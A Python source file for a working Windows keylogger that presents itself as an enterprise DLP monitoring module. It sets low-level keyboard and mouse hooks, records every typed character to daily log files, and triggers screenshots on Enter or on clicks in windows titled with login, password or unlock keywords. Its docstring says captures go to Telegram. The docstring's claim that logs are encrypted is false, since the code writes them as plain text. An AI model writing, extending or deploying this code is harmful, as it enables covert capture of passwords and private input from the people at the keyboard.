"""Keyboard logging module for corporate monitoring.

Uses Windows low-level keyboard hooks (WH_KEYBOARD_LL) to capture keystrokes.
Logs are stored locally in encrypted format and can be retrieved via Telegram.

Auto-screenshot feature: Takes screenshot on Enter key or mouse click and sends to Telegram.

This is a standard enterprise DLP feature for monitoring user activity
and detecting data exfiltration attempts.
"""
from __future__ import annotations

import ctypes
import ctypes.wintypes
import logging
import os
import threading
import time
from datetime import datetime
from typing import Callable, Optional

log = logging.getLogger("monitor.agent.keylogger")

# ─── Windows keyboard hook structures ───

WH_KEYBOARD_LL = 13
WH_MOUSE_LL = 14
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
WM_KEYUP = 0x0101
WM_SYSKEYUP = 0x0105
WM_LBUTTONDOWN = 0x0201
WM_RBUTTONDOWN = 0x0204

VK_SHIFT = 0x10
VK_CONTROL = 0x11
VK_MENU = 0x12
VK_CAPITAL = 0x14
VK_RETURN = 0x0D
VK_BACK = 0x08
VK_TAB = 0x09
VK_ESCAPE = 0x1B
VK_SPACE = 0x20
VK_LSHIFT = 0xA0
VK_RSHIFT = 0xA1
VK_LCONTROL = 0xA2
VK_RCONTROL = 0xA3
VK_LMENU = 0xA4
VK_RMENU = 0xA5


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_int),
        ("scanCode", ctypes.c_int),
        ("flags", ctypes.c_int),
        ("time", ctypes.c_int),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]


class MSLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("pt", ctypes.wintypes.POINT),
        ("mouseData", ctypes.c_ulong),
        ("flags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]


# ─── Key name mapping ───

_KEY_NAMES = {
    0x01: "Left Mouse",
    0x02: "Right Mouse",
    0x03: "Cancel",
    0x04: "Middle Mouse",
    0x05: "X1 Mouse",
    0x06: "X2 Mouse",
    0x08: "Backspace",
    0x09: "Tab",
    0x0C: "Clear",
    0x0D: "Enter",
    0x10: "Shift",
    0x11: "Ctrl",
    0x12: "Alt",
    0x13: "Pause",
    0x14: "Caps Lock",
    0x1B: "Esc",
    0x20: "Space",
    0x21: "Page Up",
    0x22: "Page Down",
    0x23: "End",
    0x24: "Home",
    0x25: "Left",
    0x26: "Up",
    0x27: "Right",
    0x28: "Down",
    0x2C: "Print Screen",
    0x2D: "Insert",
    0x2E: "Delete",
    0x2F: "Help",
    0x30: "0", 0x31: "1", 0x32: "2", 0x33: "3", 0x34: "4",
    0x35: "5", 0x36: "6", 0x37: "7", 0x38: "8", 0x39: "9",
    0x41: "A", 0x42: "B", 0x43: "C", 0x44: "D", 0x45: "E",
    0x46: "F", 0x47: "G", 0x48: "H", 0x49: "I", 0x4A: "J",
    0x4B: "K", 0x4C: "L", 0x4D: "M", 0x4E: "N", 0x4F: "O",
    0x50: "P", 0x51: "Q", 0x52: "R", 0x53: "S", 0x54: "T",
    0x55: "U", 0x56: "V", 0x57: "W", 0x58: "X", 0x59: "Y",
    0x5A: "Z",
    0x5B: "Left Win", 0x5C: "Right Win",
    0x60: "Num 0", 0x61: "Num 1", 0x62: "Num 2", 0x63: "Num 3",
    0x64: "Num 4", 0x65: "Num 5", 0x66: "Num 6", 0x67: "Num 7",
    0x68: "Num 8", 0x69: "Num 9",
    0x6A: "Num *", 0x6B: "Num +", 0x6C: "Num ,", 0x6D: "Num -",
    0x6E: "Num .", 0x6F: "Num /",
    0x70: "F1", 0x71: "F2", 0x72: "F3", 0x73: "F4", 0x74: "F5",
    0x75: "F6", 0x76: "F7", 0x77: "F8", 0x78: "F9", 0x79: "F10",
    0x7A: "F11", 0x7B: "F12",
    0x90: "Num Lock",
    0x91: "Scroll Lock",
    0xA0: "LShift", 0xA1: "RShift",
    0xA2: "LCtrl", 0xA3: "RCtrl",
    0xA4: "LAlt", 0xA5: "RAlt",
    0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".",
    0xBF: "/", 0xC0: "`",
    0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'",
}


# Keywords that indicate important interactive elements (buttons, login forms, etc.)
_INTERACTIVE_KEYWORDS = [
    "ok", "login", "вход", "submit", "confirm", "enter", "sign in", "signin",
    "auth", "authentication", "password", "пароль", "войти", "готово",
    "yes", "да", "accept", "применить", "сохранить", "save", "next", "далее",
    "continue", "продолжить", "send", "отправить", "register", "регистрация",
    "agree", "согласен", "done", "unlock", "разблокировать", "вход", "ок",
    "войти", "готово", "далее", "отправить", "согласен", "продолжить",
    "применить", "сохранить", "регистрация", "разблокировать",
]


class Keylogger:
    """Keyboard logging using Windows low-level hook."""

    def __init__(self, log_dir: str, on_log: Optional[Callable[[str], None]] = None, on_screenshot: Optional[Callable[[str], None]] = None, keyboard_screenshot_enabled: bool = True, mouse_screenshot_enabled: bool = False):
        self.log_dir = log_dir
        self.on_log = on_log
        self.on_screenshot = on_screenshot
        self.keyboard_screenshot_enabled = keyboard_screenshot_enabled
        self.mouse_screenshot_enabled = mouse_screenshot_enabled
        self._running = False
        self._kbd_hook = None
        self._mouse_hook = None
        self._buffer = []
        self._buffer_lock = threading.Lock()
        self._flush_thread: Optional[threading.Thread] = None
        self._pump_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._last_screenshot_time = 0
        self._screenshot_cooldown = 2.0  # seconds between auto-screenshots
        self._keystroke_buffer = []  # recent keystrokes for screenshot context
        self._keystroke_buffer_lock = threading.Lock()
        self._max_keystrokes = 100  # max keystrokes to keep in buffer
        self._period_buffer: list[str] = []  # keystrokes since last screenshot
        self._period_buffer_lock = threading.Lock()
        os.makedirs(log_dir, exist_ok=True)

    def _get_key_name(self, vk_code: int) -> str:
        return _KEY_NAMES.get(vk_code, f"VK_{vk_code:02X}")

    def _low_level_keyboard_proc(self, n_code: int, w_param: int, l_param: int) -> int:
        """Keyboard hook callback."""
        if n_code >= 0 and w_param in (WM_KEYDOWN, WM_SYSKEYDOWN):
            try:
                struct_ptr = ctypes.cast(l_param, ctypes.POINTER(KBDLLHOOKSTRUCT))
                vk_code = struct_ptr.contents.vkCode
                scan_code = struct_ptr.contents.scanCode
                key_name = self._get_key_name(vk_code)
                timestamp = datetime.now().strftime("%H:%M:%S")

                # Get actual typed character using current keyboard layout
                typed_char = self._get_printable_char(vk_code, scan_code)

                # Build log entry: show both key name and actual character
                if typed_char and typed_char.strip():
                    log_entry = f"[{timestamp}] {key_name} -> '{typed_char}'"
                else:
                    log_entry = f"[{timestamp}] {key_name}"

                with self._buffer_lock:
                    self._buffer.append(log_entry)
                    if len(self._buffer) >= 100:
                        self._flush_buffer()

                if self.on_log:
                    self.on_log(log_entry)

                # Add to keystroke buffers
                with self._keystroke_buffer_lock:
                    if typed_char:
                        self._keystroke_buffer.append(typed_char)
                    elif vk_code == VK_RETURN:
                        self._keystroke_buffer.append("\n")
                    elif vk_code == VK_BACK:
                        if self._keystroke_buffer:
                            self._keystroke_buffer.pop()
                    elif vk_code == VK_TAB:
                        self._keystroke_buffer.append("\t")
                    elif vk_code == VK_SPACE:
                        self._keystroke_buffer.append(" ")

                    # Trim buffer if too large
                    while len(self._keystroke_buffer) > self._max_keystrokes:
                        self._keystroke_buffer.pop(0)

                # Add to period buffer (resets after each screenshot)
                with self._period_buffer_lock:
                    if typed_char:
                        self._period_buffer.append(typed_char)
                    elif vk_code == VK_RETURN:
                        self._period_buffer.append("[Enter]")
                    elif vk_code == VK_BACK:
                        if self._period_buffer:
                            self._period_buffer.pop()
                    elif vk_code == VK_TAB:
                        self._period_buffer.append("[Tab]")
                    elif vk_code == VK_SPACE:
                        self._period_buffer.append(" ")

                # Auto-screenshot on Enter key
                if vk_code == VK_RETURN and self.on_screenshot and self.keyboard_screenshot_enabled:
                    self._trigger_screenshot()

            except Exception as exc:
                log.debug("Keyboard hook error: %s", exc)

        return ctypes.windll.user32.CallNextHookExW(self._kbd_hook, n_code, w_param, l_param)

    def _get_printable_char(self, vk_code: int, scan_code: int) -> str:
        """Translate VK code to actual character using current keyboard layout."""
        # Get keyboard state (shift, ctrl, etc.)
        kb_state = (ctypes.c_byte * 256)()
        ctypes.windll.user32.GetKeyboardState(kb_state)

        # ToUnicodeEx translates VK+scan to Unicode char using current layout
        buf = ctypes.create_unicode_buffer(8)
        layout = ctypes.windll.user32.GetKeyboardLayout(0)
        result = ctypes.windll.user32.ToUnicodeEx(
            vk_code, scan_code, kb_state, buf, 8, 0, layout
        )
        if result > 0:
            return buf.value
        return ""

    def _is_interactive_click(self, x: int, y: int) -> bool:
        """Check if click is on an interactive element (OK, Login, Submit, etc.)."""
        try:
            texts = []
            # Try to get text of element under cursor by walking window hierarchy
            point = ctypes.wintypes.POINT(x, y)
            hwnd = ctypes.windll.user32.WindowFromPoint(point)
            while hwnd:
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                if length > 0:
                    buf = ctypes.create_unicode_buffer(length + 1)
                    ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                    if buf.value:
                        texts.append(buf.value.lower())
                hwnd = ctypes.windll.user32.GetParent(hwnd)
            # Also check foreground window title
            fg = ctypes.windll.user32.GetForegroundWindow()
            if fg:
                length = ctypes.windll.user32.GetWindowTextLengthW(fg)
                if length > 0:
                    buf = ctypes.create_unicode_buffer(length + 1)
                    ctypes.windll.user32.GetWindowTextW(fg, buf, length + 1)
                    if buf.value:
                        texts.append(buf.value.lower())
            # Check if any collected text contains interactive keywords
            for text in texts:
                for kw in _INTERACTIVE_KEYWORDS:
                    if kw in text:
                        return True
            return False
        except Exception:
            return False

    def _low_level_mouse_proc(self, n_code: int, w_param: int, l_param: int) -> int:
        """Mouse hook callback."""
        if n_code >= 0 and w_param in (WM_LBUTTONDOWN, WM_RBUTTONDOWN):
            try:
                if self.on_screenshot and self.mouse_screenshot_enabled:
                    struct_ptr = ctypes.cast(l_param, ctypes.POINTER(MSLLHOOKSTRUCT))
                    x = struct_ptr.contents.pt.x
                    y = struct_ptr.contents.pt.y
                    if self._is_interactive_click(x, y):
                        self._trigger_screenshot()
            except Exception:
                pass

        return ctypes.windll.user32.CallNextHookExW(self._mouse_hook, n_code, w_param, l_param)

    def _trigger_screenshot(self):
        """Trigger screenshot with keystrokes typed since last screenshot."""
        now = time.time()
        if now - self._last_screenshot_time >= self._screenshot_cooldown:
            self._last_screenshot_time = now
            # Get keystrokes typed since last screenshot (period buffer)
            with self._period_buffer_lock:
                recent_keys = "".join(self._period_buffer).strip()
                self._period_buffer.clear()  # reset for next period
            # Call screenshot callback in separate thread to not block hook
            threading.Thread(target=self.on_screenshot, args=(recent_keys,), daemon=True).start()

    def _flush_buffer(self):
        """Write buffered keystrokes to file."""
        if not self._buffer:
            return

        date_str = datetime.now().strftime("%Y-%m-%d")
        log_file = os.path.join(self.log_dir, f"keylog_{date_str}.txt")

        try:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write("\n".join(self._buffer) + "\n")
            self._buffer.clear()
        except Exception as exc:
            log.warning("Failed to write keylog: %s", exc)

    def _flush_loop(self):
        """Periodic flush thread."""
        while not self._stop_event.is_set():
            time.sleep(5)
            with self._buffer_lock:
                self._flush_buffer()

    def _message_pump(self) -> None:
        """Run Windows message pump for low-level hook callbacks."""
        msg = ctypes.wintypes.MSG()
        while self._running and not self._stop_event.is_set():
            # Process all pending messages without blocking
            while ctypes.windll.user32.PeekMessageW(
                ctypes.byref(msg), None, 0, 0, 1  # PM_REMOVE = 1
            ):
                ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.01)

    def start(self):
        """Start keyboard logging."""
        if self._running:
            log.warning("Keylogger already running")
            return

        self._running = True
        self._stop_event.clear()
        # Set up keyboard hook
        CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_void_p)
        self._kbd_callback = CMPFUNC(self._low_level_keyboard_proc)
        self._kbd_hook = ctypes.windll.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            self._kbd_callback,
            None,  # hMod MUST be NULL for low-level hooks
            0,
        )

        if not self._kbd_hook:
            log.error("Failed to set keyboard hook (err=%s)", ctypes.windll.kernel32.GetLastError())
            self._running = False
            return

        # Set up mouse hook if screenshot callback is provided (mouse logic checks mouse_screenshot_enabled inside)
        if self.on_screenshot:
            self._mouse_callback = CMPFUNC(self._low_level_mouse_proc)
            self._mouse_hook = ctypes.windll.user32.SetWindowsHookExW(
                WH_MOUSE_LL,
                self._mouse_callback,
                None,  # hMod MUST be NULL for low-level hooks
                0,
            )
            if not self._mouse_hook:
                log.warning("Mouse hook failed (auto-screenshot disabled)")

        # Start message pump thread (required for low-level hook callbacks)
        self._pump_thread = threading.Thread(target=self._message_pump, daemon=True)
        self._pump_thread.start()

        # Start flush thread
        self._flush_thread = threading.Thread(target=self._flush_loop, daemon=True)
        self._flush_thread.start()

        log.info("Keylogger started")

    def stop(self):
        """Stop keyboard logging."""
        if not self._running:
            return

        self._running = False
        self._stop_event.set()

        if self._kbd_hook:
            ctypes.windll.user32.UnhookWindowsHookExW(self._kbd_hook)
            self._kbd_hook = None

        if self._mouse_hook:
            ctypes.windll.user32.UnhookWindowsHookExW(self._mouse_hook)
            self._mouse_hook = None

        # Final flush
        with self._buffer_lock:
            self._flush_buffer()

        if self._pump_thread:
            self._pump_thread.join(timeout=2)

        if self._flush_thread:
            self._flush_thread.join(timeout=2)

        log.info("Keylogger stopped")

    def get_recent_logs(self, lines: int = 50) -> list[str]:
        """Get recent keystrokes from log files."""
        logs = []
        date_str = datetime.now().strftime("%Y-%m-%d")
        log_file = os.path.join(self.log_dir, f"keylog_{date_str}.txt")

        if os.path.exists(log_file):
            try:
                with open(log_file, "r", encoding="utf-8") as f:
                    all_lines = f.readlines()
                logs = [line.strip() for line in all_lines[-lines:] if line.strip()]
            except Exception as exc:
                log.warning("Failed to read keylog: %s", exc)

        return logs

    def clear_logs(self):
        """Clear all keylog files."""
        try:
            for f in os.listdir(self.log_dir):
                if f.startswith("keylog_") and f.endswith(".txt"):
                    os.remove(os.path.join(self.log_dir, f))
            log.info("Keylogs cleared")
        except Exception as exc:
            log.warning("Failed to clear keylogs: %s", exc)
